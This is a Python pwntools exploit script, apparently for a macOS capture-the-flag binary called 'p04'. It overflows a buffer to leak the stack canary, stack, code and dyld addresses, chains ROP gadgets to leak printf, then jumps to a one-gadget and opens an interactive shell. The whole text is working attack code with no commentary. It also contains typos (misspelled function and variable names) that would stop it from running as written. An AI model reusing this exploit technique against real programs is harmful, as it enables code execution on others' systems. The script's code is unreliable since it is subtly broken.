from pwn import *

p=process('p04')
#leak canary & stack
payload = "a"*0x18
p.send(payload)
p.revuntil(payload)
leak=u64(p.recv(1).ljust(8,'\x00'))

payload += "a"*2
p.send(payload)
p.recvuntil(payload)
leak += u64(p.recv(6).rjust(8,'\x00'))
canary = leak
stack = u64(p.recv(6).ljust(8,'\x00'))

log.info('canary = 0x%x' % canary)
log.info("stack = 0x%x" % stack)

#leak code
payload = "a"*0x28
p.send(payload)
p.recvuntil(payload)
code = u64(p.recv(5).ljust(8,'\x00')) -0xf39
log.info('code = 0x%x'%code)

#leak dyld

paayload = "a"*0x48
p.send(payload)
p.recvuntil(payload)
dyld = u64(p.recv(6).ljust(8,'\x00'))-(0x7fff6f7de3d5-0x7fff6f7c8000)
log.info("dyld = 0x%x" % dyld)

#leak printf in libsystem_c.dylib
main = code + 0xef0
puts = code + 0xf4e
read = code + 0xf54
readGadget = code + 0xe88
printf = code + 0xf48
printf_lazy = code+0x1030
rsippRet = dyld +0xe2d
rdiPret = dyld +0xe2f

payload = "q"*0x18
payload += p64(canary)
payload += p64(stack)
payload += p64(rdiPRet)
payload += p64(printf_lazy)
payload += p64(printf_lazy +0x20)
paylaod += p64(puts)
payload += p64(readGadget)

p.send(payload)

p.recvline()

printf=u64(p.recv(6).ljust(8,'\x00'))
oneshot = printf - (0x40ec4 -0x2573b)
log.info("printf = 0x%x" % printf)
log.info("oneshot = 0x%x" % oneshot)

p.send(p64(oneshot))

p.interactive()


